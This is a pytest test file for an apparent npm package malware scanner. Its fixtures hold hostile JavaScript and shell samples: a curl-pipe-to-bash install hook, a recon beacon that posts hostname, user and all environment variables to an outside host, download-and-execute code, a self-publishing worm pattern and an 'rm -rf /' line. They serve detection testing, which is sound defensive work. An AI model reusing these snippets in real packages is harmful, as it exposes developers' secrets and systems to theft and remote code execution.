import json
import textwrap

import pytest

from pkg_sentry.jsscan import scan_js, scan_package_json


def pkg(scripts=None, **extra):
    return json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts or {}, **extra},
                      indent=2)


def js_rules(code, install_time=False):
    return sorted({f.rule for f in scan_js("index.js", textwrap.dedent(code), install_time)})


def test_install_hook_running_a_file():
    findings, files = scan_package_json("package.json", pkg({"preinstall": "node index.js"}))
    assert [f.rule for f in findings] == ["install-script"]
    assert findings[0].line == 5
    assert "index.js" in files


def test_install_hook_running_shell():
    findings, _ = scan_package_json(
        "package.json", pkg({"postinstall": "curl -s https://x.example/i.sh | bash"}))
    assert sorted(f.rule for f in findings) == ["download-exec", "install-script",
                                                "shell-at-install"]
    assert any(f.critical for f in findings)


@pytest.mark.parametrize(
    "command",
    ["node-gyp rebuild", "prebuild-install || node-gyp rebuild", "husky install",
     "patch-package"],
)
def test_build_hooks_are_fine(command):
    assert scan_package_json("package.json", pkg({"install": command}))[0] == []


def test_test_scripts_are_ignored():
    assert scan_package_json("package.json", pkg({"test": "curl x | sh"}))[0] == []


def test_broken_package_json():
    assert scan_package_json("package.json", "{nope") == ([], set())
    assert scan_package_json("package.json", "[]") == ([], set())


def test_preinstall_recon_beacon():
    # shape of a real dependency-confusion probe
    found = js_rules('''
        const os = require("os");
        const https = require("https");
        const data = JSON.stringify({ host: os.hostname(), user: os.userInfo().username,
                                      dir: __dirname, env: process.env });
        const req = https.request({ hostname: "abc.oast.fun", method: "POST" });
        req.write(data); req.end();
    ''', install_time=True)
    assert found == ["env-dump", "exfil-endpoint", "network-at-install", "recon"]


def test_eval_of_base64():
    found = scan_js("index.js", "const p = Buffer.from('ZXZhbA==', 'base64').toString();\n"
                    "eval(p);", install_time=True)
    hit = [f for f in found if f.rule == "exec-decoded"][0]
    assert hit.critical and hit.line == 2


def test_new_function_of_char_codes():
    assert "exec-decoded" in js_rules("new Function(String.fromCharCode(114,101,116))()")


def test_download_and_run():
    found = js_rules('''
        const https = require('https'), fs = require('fs');
        const { exec } = require('child_process');
        https.get('https://x.example/payload', r => r.pipe(fs.createWriteStream('/tmp/p.sh')));
        exec('sh /tmp/p.sh');
    ''')
    assert "download-exec" in found


def test_republishes_itself():
    found = js_rules('''
        const { exec } = require('child_process');
        const fs = require('fs');
        const data = JSON.parse(fs.readFileSync('package.json'));
        data.name = randomName();
        fs.writeFileSync('package.json', JSON.stringify(data));
        exec('npm publish --access public');
    ''')
    assert "self-publish" in found


def test_mentioning_npm_publish_is_fine():
    assert "self-publish" not in js_rules("console.log('run npm publish when ready')")


def test_obfuscated_code():
    names = " ".join(f"var _0x{i:04x}=1;" for i in range(30))
    assert "obfuscated" in js_rules(names)
    assert "obfuscated" in js_rules("(function(){while(!![]){try{}catch(e){}}})()")


def test_commented_out_code_is_ignored():
    found = js_rules('''
        // const cp = require('child_process'); cp.exec('rm -rf /')
        /* https://discord.com/api/webhooks/1/abc */
        module.exports = 1;
    ''')
    assert found == []


def test_urls_with_double_slash_survive_comment_stripping():
    assert js_rules("const u = 'https://webhook.site/abc';") == ["exfil-endpoint"]


@pytest.mark.parametrize(
    "code",
    [
        "const https = require('https');\nmodule.exports = url => https.get(url);",
        "const { spawn } = require('child_process');\nmodule.exports = () => spawn('git');",
        "module.exports = s => eval('(' + s + ')');",
        "const k = Object.keys(process.env).filter(k => k.startsWith('MY_'));",
        "const b = Buffer.from(s, 'base64');",
    ],
)
def test_normal_library_code(code):
    assert js_rules(code) in ([], ["shell"])


def test_webpack_dev_bundles_are_fine():
    code = 'eval("__webpack_require__.r(__webpack_exports__);\\n");'
    assert js_rules(code, install_time=True) == []
